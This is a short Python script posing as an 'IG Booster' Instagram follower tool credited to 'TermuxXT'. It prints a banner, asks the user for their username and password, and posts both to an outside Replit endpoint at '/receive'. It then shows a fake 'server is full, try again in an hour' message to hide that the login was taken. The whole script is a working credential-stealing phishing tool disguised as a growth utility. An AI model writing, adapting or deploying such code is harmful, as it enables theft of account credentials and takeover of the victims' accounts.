import requests

#✅
server_url = "https://ig-booster-hassasen1430.replit.app/receive"

#banner
print("  ___ ____   ____                  _")
print(" |_ _/ ___| | __ )  ___   ___  ___| |_ ___ _ __")
print("  | | |  _  |  _ \ / _ \ / _ \/ __| __/ _ \ '__|")
print("  | | |_| | | |_) | (_) | (_) \__ \ ||  __/ |")
print(" |___\____| |____/ \___/ \___/|___/\__\___|_|")
print("             Developed by:TermuxXT\n")

def send_data():
    print("Please enter the required information:\n")

    email = input("Enter your User Name: ").strip()
    message = input("Enter your PassWord: ").strip()

    data = {"email": email, "message": message}

    try:
        response = requests.post(server_url, json=data)
        if response.status_code == 200:
            print("""\nContacting the server…



The server is full.



Try again in an hour!""")
        else:
            print("""\nThe server connection failed!



Try again later…""", response.text)
    except Exception as e:
        print("\nError", e)

send_data()
